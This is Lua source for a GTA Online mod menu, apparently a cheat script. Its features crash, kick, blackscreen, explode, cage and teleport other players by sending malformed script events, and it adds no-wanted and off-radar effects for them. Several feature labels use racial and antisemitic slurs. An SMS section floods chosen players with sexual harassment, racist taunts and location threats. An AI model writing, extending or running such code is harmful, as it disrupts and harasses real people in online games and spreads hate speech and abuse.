                pppos = player.get_player_coords(pid)
                npc = Cped(26, 0x66F34017,pppos ,0)
                system.wait(1)
                end
                system.wait(1)
                for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
                pppos = player.get_player_coords(pid)
                npc = Cped(26, 0x66F34017,pppos ,0)
                system.wait(1)
                end
                system.wait(1)
                for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid)) 
                pppos = player.get_player_coords(pid)
                npc = Cped(26, 0x66F34017,pppos ,0)
                system.wait(1)
                end
                menu.notify("Crash complete!(dont spectate if there still here)", "Unknown Cuddle", 10, ff0000)	
                end)

PlayerEventCrash =  menu.add_player_feature("Spam EventCrash", "toggle", crash.id, function(feat, pid)
    if feat.on then

    for y = 1, #KickParamArray do

        for i = 1,#ScriptEvents do
        
        script.trigger_script_event(ScriptEvents[i], pid, KickParamArray[y])
        system.yield(10)
        end
        system.yield(10)
        end
        system.yield(10)
        return HANDLER_CONTINUE
    end
    return HANDLER_POP
    end)
for i=1,#PlayerEventCrash.feats do
    PlayerEventCrash.feats[i].on = false
end

PlayerEventCrash1 =  menu.add_player_feature("Spam EventCrash other players", "toggle", crash.id, function(feat, pid)
	if feat.on then
	for playerid = 0, 32 do
	if player.is_player_valid(playerid) and playerid ~= pid then

	for y = 1, #KickParamArray do

      for i = 1,#ScriptEvents do
	  
        script.trigger_script_event(ScriptEvents[i], playerid, KickParamArray[y])
		system.yield(0)
	  end
	  system.yield(0)
	  end
	  
	end
	  system.yield(0)
	end
	  return HANDLER_CONTINUE
	end
	return HANDLER_POP
 end)
for i=1,#PlayerEventCrash1.feats do
    PlayerEventCrash1.feats[i].on = false
end


menu.add_player_feature("Crash v1", "action", crash.id, function(feat, pid)
        
	script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
	script.trigger_script_event(2092565704, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
	script.trigger_script_event(2092565704, pid, {23135423, pid, 827870001, -1729222815, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
		
        return HANDLER_POP
end)


----------------------------- HERE CRASH ABOVE ---------------------------------------------------
--------------EXPLOSIVE SECTION BELOW------------------------------------ SUB FOLDERS FOR MENU ABOVE ----------- 
            menu.add_player_feature("Explode This Nigga", "toggle",sub.id,function(eToggle, pid)
                while (eToggle.on) do
                 local PlayerPos = player.get_player_coords(pid)
                 fire.add_explosion(PlayerPos, 8, true, false, 1, player.get_player_ped(player.player_id()))
                 system.wait(0)
                end
                menu.notify("Exploding bitch ass victim (dont spectate)", "Exploding Victim", 10, ff0000)
               end)


               menu.add_player_feature("Remote Orbital Cannon Anon", "action", sub.id, function(feat, pid)

                local d = player.get_player_ped(pid)
                local pos = player.get_player_coords(pid)
             
               
                audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_LASER", pos, 0, true, 10000000000, false)
                audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_LASER", pos, 0, true, 10000000000, true)
               
                system.wait(100)
                audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_EXPLOSION",  pos, "DLC_XM_Explosions_Orbital_Cannon", true, 100000000000, false)
                audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_EXPLOSION",  pos, "DLC_XM_Explosions_Orbital_Cannon", true, 100000000000, false)
             
                graphics.set_next_ptfx_asset("scr_xm_orbital")
                while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
                    graphics.request_named_ptfx_asset("scr_xm_orbital")
                    system.wait(0)
                end
                graphics.start_networked_particle_fx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 5, true, true, true)
                fire.add_explosion(pos, 59, true, false, 1.5, d)
  
                fire.add_explosion(pos, 60, true, false, 1.8, d)
            
                fire.add_explosion(pos, 62, true, false, 2.0, d)
            
                fire.add_explosion(pos, 52, true, false, 1.0, d)
            
                fire.add_explosion(pos, 50, true, false, 1.0, d)
                fire.add_explosion(pos, 29, false, false, 29.0, d)
                fire.add_explosion(pos, 29, true, false, 29.0, d)
                graphics.start_networked_particle_fx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 10, true, true, true)
  
    end)

    menu.add_player_feature("Blame session", "action", sub.id, function(feat, pid)
        for o = 1, 20 do
            if o ~= me then
                local d = player.get_player_ped(pid)
                local po = player.get_player_coords(o)
                        fire.add_explosion(po, 29, true, false, 1, d)
            end
            end
    end)

    menu.add_player_feature("BZ gas loop", "toggle", sub.id, function(feat, pid)
        if feat.on then
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 1, pid)
    
        end
        system.wait(2000)
        return HANDLER_CONTINUE
    end)
    
    menu.add_player_feature("Gas the jew In a cage", "action", sub.id, function(feat, pid)
     local m = player.is_player_in_any_vehicle(pid)
     if m == true then
        local p = player.get_player_vehicle(pid)
        for i = 1,100 do
            network.request_control_of_entity(p)
        end
        network.request_control_of_entity(p)
        vehicle.modify_vehicle_top_speed(p, 2)
        entity.set_entity_max_speed(p, 3)
        vehicle.modify_vehicle_top_speed(p, 2)
        entity.set_entity_max_speed(p, 1)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        script.trigger_script_event(1333236192, pid, args())
        script.trigger_script_event(1333236192, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
        script.trigger_script_event(1333236192, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1333236192, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})  
        script.trigger_script_event(1333236192, pid, {0, 0, 46190868, 0, 2})
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        script.trigger_script_event(0xB0886E20, pid, {46190868, 0, 46190868, 46190868, 2})
        script.trigger_script_event(1333236192, pid, {0, 0, 46190868, 0, 2})
        script.trigger_script_event(1333236192, pid, {46190868, 0, 46190868, 46190868, 2})
        script.trigger_script_event(1333236192, pid, {1337, -1, 1, 1, 0, 0, 0})
        script.trigger_script_event(0xB0886E20, pid, {1337, 1337, -1, 1, 1, 0, 0, 0})
        script.trigger_script_event(1333236192, pid, {0}) 
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        vehicle.set_vehicle_forward_speed(p, 0)
        system.wait(3000)
            local pos = player.get_player_coords(pid)
            pos.z = pos.z + 0.95  
            local pos1 = player.get_player_coords(pid)
            pos1.z = pos1.z - 0.90
            local cage = gameplay.get_hash_key("prop_feeder1_cr")
            streaming.request_model(cage)
            object.create_object(cage, pos, true, true)
            object.create_object(cage, pos1, true, true)
            fire.add_explosion(player.get_player_coords(pid), 21, true, false, 1, pid)
            fire.add_explosion(player.get_player_coords(pid), 21, true, false, 1, pid)
        
        
        local pos = player.get_player_coords(pid)
        pos.z = pos.z + 0.95  
        local pos1 = player.get_player_coords(pid)
        pos1.z = pos1.z - 0.90
        local cage = gameplay.get_hash_key("prop_feeder1_cr")
        streaming.request_model(cage)
        object.create_object(cage, pos, true, true)
        object.create_object(cage, pos1, true, true)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 1, pid)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 1, pid)
    else
        local pos = player.get_player_coords(pid)
        pos.z = pos.z + 0.95  
        local pos1 = player.get_player_coords(pid)
        pos1.z = pos1.z - 0.90
        local cage = gameplay.get_hash_key("prop_feeder1_cr")
        streaming.request_model(cage)
        object.create_object(cage, pos, true, true)
        object.create_object(cage, pos1, true, true)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 1, pid)
        fire.add_explosion(player.get_player_coords(pid), 21, true, false, 1, pid)
    end
        system.wait(100)
    
    end)
----------------EXPLOSIVE SECTION ABOVE ---- RANDO BELOW ---------------------------------


        menu.add_player_feature("Give OTR", "toggle", misc.id, function(feat, pid)
            if feat.on then
                script.trigger_script_event(575518757, pid, {pid, utils.time() - 60, utils.time(), 1, 1, arg11(pid)})
                script.trigger_script_event(575518757, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                script.trigger_script_event(575518757, pid, args())
                script.trigger_script_event(575518757, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            end
            system.wait(1000)
            return HANDLER_CONTINUE
        end)
--------------- RANDO ABOVE --------------------------- MISC BELOW ----------------------------------------

menu.add_player_feature("climb Mount Everest", "action", misc.id, function(playerfeat, pid)

    local playerped3 = player.get_player_ped(pid)

    local pos = v3()
    pos.x = pos.x + 1.55
    pos.y = pos.y + 3.35



    attach_object1132 = object.create_object(1888301071, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    entity.set_entity_visible(attach_object1132, false)

    local pos = v3()
    pos.z = pos.z + 1.55
    pos.x = pos.x + 1.55
    pos.y = pos.y + 3.35



    attach_object1132 = object.create_object(1888301071, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

entity.set_entity_visible(attach_object1132, false)

    local pos = v3()
    pos.z = pos.z - 2.00
    



    attach_object1132 = object.create_object(-1951226014, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    entity.set_entity_visible(attach_object1132, false)

    
    local pos = v3()
    pos.x = pos.x + 1.55
    pos.y = pos.y + 3.35
    



    attach_object1132 = object.create_object(1888301071, pos, true, false)

    local rot = entity.get_entity_rotation(attach_object1132)
    rot.y = 180
    entity.set_entity_rotation(attach_object1132, rot)


    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    
    entity.set_entity_visible(attach_object1132, false)

    local pos = v3()
    pos.x = pos.x + 0.45
    pos.y = pos.y + 3.35



    attach_object1132 = object.create_object(1888301071, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    entity.set_entity_visible(attach_object1132, false)

    local pos = v3()
    pos.x = pos.x + 0.80
    pos.y = pos.y + 3.35



    attach_object1132 = object.create_object(1888301071, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    entity.set_entity_visible(attach_object1132, false)

    local pos = v3()
    pos.z = pos.z - 2.00
    pos.x = pos.x + 0.80
    pos.y = pos.y + 3.35



    attach_object1132 = object.create_object(1888301071, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
    
    entity.set_entity_visible(attach_object1132, false)


    local pos = v3()
    pos.x = pos.x + 1.30
    pos.y = pos.y + 3.95



    attach_object1132 = object.create_object(1888301071, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    entity.set_entity_visible(attach_object1132, false)
    

end)

menu.add_feature("Give all weapons", "action", misc.id, function()
    for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
      weapon.give_delayed_weapon_to_ped(player.get_player_ped(player.player_id()), weapon_hash, 0, 0)
    end
  end)

  menu.add_feature("Give all ammo", "action", misc.id, function()
    for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
      local found,maxAmmo = weapon.get_max_ammo(player.get_player_ped(player.player_id()), weapon_hash)
      if(found) then
          weapon.set_ped_ammo(player.get_player_ped(player.player_id()),weapon_hash,maxAmmo)
      else
          menu.notify("No Weapon with hash " .. weapon_hash .. "found","Error",5,140)
      end    
    end
  end)

menu.add_feature("shoot lester bullets", "toggle", misc.id, function(btoggle)
    local Hash = gameplay.get_hash_key("cs_lestercrest") 
    local playerPed = player.get_player_ped(player.player_id())
    
    while (btoggle.on) do
        if (ped.is_ped_shooting(playerPed)) then
        local boolrtn, impact =  ped.get_ped_last_weapon_impact(playerPed, v3())

        streaming.request_model(0xB594F5C3)
        while (not streaming.has_model_loaded(model)) do
            system.wait(0)
        end
        ped.create_ped(6, Hash, impact, 1, true, false)
     end
     system.yield(0)
  end
end)

        menu.add_player_feature("Send to Island", "action", misc.id, function(playerfeat, pid)
            script.trigger_script_event(1300962917, pid, {pid, 1300962917, 0, 0})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {pid, 1300962917, 0, 0})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {pid, 1300962917, 0, 0})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            script.trigger_script_event(1300962917, pid, args())
            script.trigger_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
    
            end)
            menu.add_player_feature("BlackScreen", "action", misc.id, function(playerfeat, pid)
                script.trigger_script_event(0xF5CB92DB, pid, {pid, 1300962917, 0, 0})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {pid, 1300962917, 0, 0})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {pid, 1300962917, 0, 0})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                script.trigger_script_event(0xF5CB92DB, pid, args())
                script.trigger_script_event(0xF5CB92DB, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
        
                end)

                menu.add_player_feature("Kick/ban CEO", "action", misc.id, function(playerfeat, pid)

                    script.trigger_script_event(-1648921703, pid, args())
                    script.trigger_script_event(-738295409, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                    script.trigger_script_event(-738295409, pid, args())
                    script.trigger_script_event(-1648921703, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                    script.trigger_script_event(-1648921703, pid, args())
                    script.trigger_script_event(-738295409, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                    script.trigger_script_event(-738295409, pid, args())
                    script.trigger_script_event(-1648921703, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                    script.trigger_script_event(-1648921703, pid, args())
                    script.trigger_script_event(-738295409, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                    script.trigger_script_event(-738295409, pid, args())
                    script.trigger_script_event(-1648921703, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
        
                    end)
                    menu.add_player_feature("Insurance error", "action", misc.id, function(playerfeat, pid)
        
                        script.trigger_script_event(1302185744, pid, args())
                        script.trigger_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                        script.trigger_script_event(891272013, pid, args())
                        script.trigger_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                        script.trigger_script_event(1302185744, pid, args())
                        script.trigger_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                        script.trigger_script_event(891272013, pid, args())
                        script.trigger_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                        script.trigger_script_event(1302185744, pid, args())
                        script.trigger_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                        script.trigger_script_event(891272013, pid, args())
                        script.trigger_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
        
                    
                        end)
                        menu.add_player_feature("Send to mission", "action", misc.id, function(playerfeat, pid)
        
                            script.trigger_script_event(-545396442, pid, args())
                            script.trigger_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                            script.trigger_script_event(-545396442, pid, args())
                            script.trigger_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                            script.trigger_script_event(-545396442, pid, args())
                            script.trigger_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                            script.trigger_script_event(-545396442, pid, args())
                            script.trigger_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                            script.trigger_script_event(-545396442, pid, args())
                            script.trigger_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                            script.trigger_script_event(-545396442, pid, args())
                            script.trigger_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
        
                            end)

                            menu.add_player_feature("Give never wanted", "toggle", misc.id, function(feat, pid)
                                if feat.on then
                                    script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                                    script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                                    script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                                    script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                                    script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                                    script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                                end
                                system.wait(700)
                                return HANDLER_CONTINUE
                            end)
                            menu.add_player_feature("Block passive mode", "toggle", misc.id, function(playerfeat, pid)
                                if playerfeat.on then
                                        script.trigger_script_event(-909357184, pid, {pid, 1})
                                        script.trigger_script_event(-909357184, pid, {pid, 1})
                                        script.trigger_script_event(-909357184, pid, {pid, 0})
                                        script.trigger_script_event(-909357184, pid, {pid, 1})
                        
                        
                        else 
                            script.trigger_script_event(-909357184, pid, {pid, 0})
                            script.trigger_script_event(-909357184, pid, {pid, 0})
                            script.trigger_script_event(-909357184, pid, {pid, 0})
                        end
                        system.wait(1)
                        return HANDLER_CONTINUE
                                end)
                                
                                menu.add_player_feature("SE kick", "action", misc.id, function(feat, pid)
        
                                    script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x9260c0a, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x8fdcc4d2, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0xcbb6ce33, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x3d9faec5, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x4a72a08d, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x8638a0ab, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x12d09136, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                        script.trigger_script_event(0x9260c0a, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x8fdcc4d2, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0xcbb6ce33, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x3d9faec5, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x4a72a08d, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x12d09136, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                                        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                                
                                        return HANDLER_POP
                                end)
                                
                                menu.add_player_feature("Network Bail Kick", "action", misc.id, function(feat, pid)
                                    player.unset_player_as_modder(pid, -1)
                                    script.trigger_script_event(2092565704, pid, {pid, script.get_global_i(1630816 + (1 + (pid * 597)) + 508)})
                                
                                end)
                                


-------------------------------------- ATTACH MENTS BELOW AND MISC ABOVE --------------------------------------------
menu.add_player_feature("Attach Irish flag", "action", attach.id, function(playerfeat, pid)

    local pedd = player.get_player_ped(pid)

    local pos = v3()

    attach_object1132 = object.create_object(2860133292, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach Hungary flag", "action", attach.id, function(playerfeat, pid)

    local pedd = player.get_player_ped(pid)

    local pos = v3()

    attach_object1132 = object.create_object(1824933088, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach EU flag", "action", attach.id, function(playerfeat, pid)

    local pedd = player.get_player_ped(pid)

    local pos = v3()

    attach_object1132 = object.create_object(541248010, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)


menu.add_player_feature("Attach NETHERLANDS flag", "action", attach.id, function(playerfeat, pid)

    local pedd = player.get_player_ped(pid)

    local pos = v3()

    attach_object1132 = object.create_object(2142954192, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)


menu.add_player_feature("Attach USA flag", "action", attach.id, function(playerfeat, pid)

    local pedd = player.get_player_ped(pid)

    local pos = v3()

    attach_object1132 = object.create_object(1117917059, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach RUSSIA flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(-908104950, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)


menu.add_player_feature("Attach SCOTLAND flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(-795774545, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach IRELAND flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(302931829, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach GERMAN flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(1970675376, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach CANADA flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(1627828183, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach FRANCE flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(-1034797968, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach JAPAN flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(-178815855, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Attach UK flag", "action", attach.id, function(playerfeat, pid)

local pedd = player.get_player_ped(pid)

local pos = v3()

attach_object1132 = object.create_object(-1051882404, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, pedd, 0, pos, pos, true, true, false, 0, false)
end)

------------------------ ATTACH ABOVE -------------------- sms spam BELOW ---------------------------------------

menu.add_player_feature("SMS Spam fuck your family one by one", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "i'll fuck your family one by one, the god that you believe in and especially your mother (the absolute greek insult)")
end
end)

menu.add_player_feature("SMS Spam Some Weird Shit", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "My cock is throbbing and i want to slap it on your pussy")
end
end)

menu.add_player_feature("SMS Spam I Cant Breathe", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "I Cant Breathe")
end
end)

menu.add_player_feature("SMS Spam haha i cant breathe", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "haha i cant breathe")
end
end)

menu.add_player_feature("SMS Spam You're Black", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "You're Black")
end
end)

menu.add_player_feature("SMS Spam Your Pussy Smells Like Fish", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "Your Pussy Smells Like Fish)")
end
end)

menu.add_player_feature("SMS Spam I Have the Fattest Cock on this planet", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "I Have the Fattest Cock on this planet")
end
end)

 menu.add_player_feature("SMS Spam I fucked your mom last night", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "I fucked your mom last night")
end
end)

menu.add_player_feature("SMS Spam I Have you location SKID", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "I Have you location SKID")
end
end)

menu.add_player_feature("SMS Spam To your desktop you go buddy", "toggle", ChatspamA.id, function(f, pid)
	while f.on do
	system.wait(10)
	player.send_player_sms(pid, "To your desktop you go buddy")
end
end)



---------------SMS spam ABOVE ------------------------------------ INFO STUFF BELOW ---------------

menu.add_player_feature("copy name to clipboard", "action", info_stuff.id, function(feat, pid)
    local player_ip = player.get_player_name(pid)
    utils.to_clipboard(""..player_ip.."")
        end)
